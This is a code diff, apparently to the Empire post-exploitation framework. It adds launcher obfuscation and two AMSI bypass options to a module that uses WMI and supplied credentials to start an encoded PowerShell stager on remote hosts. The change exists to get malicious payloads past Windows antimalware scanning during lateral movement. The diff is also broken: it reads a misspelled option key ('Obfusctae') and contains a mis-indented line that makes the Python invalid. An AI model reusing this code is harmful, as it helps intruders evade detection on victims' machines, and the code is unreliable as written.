@@ -61,6 +61,26 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'UserName' : {
                 'Description'   :   r'[domain\]username to use to execute command.',
                 'Required'      :   False,
@@ -107,6 +127,10 @@ class Module(object):
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
 
         # management options
         cleanup = self.options['Cleanup']['Value']        
@@ -115,6 +139,13 @@ class Module(object):
         listenerName = self.options['Listener']['Value']
         userName = self.options['UserName']['Value']
         password = self.options['Password']['Value']
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         # storage options
         regPath = self.options['RegPath']['Value']
@@ -154,7 +185,7 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -196,6 +227,7 @@ class Module(object):
             script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
 
         script += ";'Invoke-Wmi executed on " +computerNames + statusMsg+"'"
+            script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
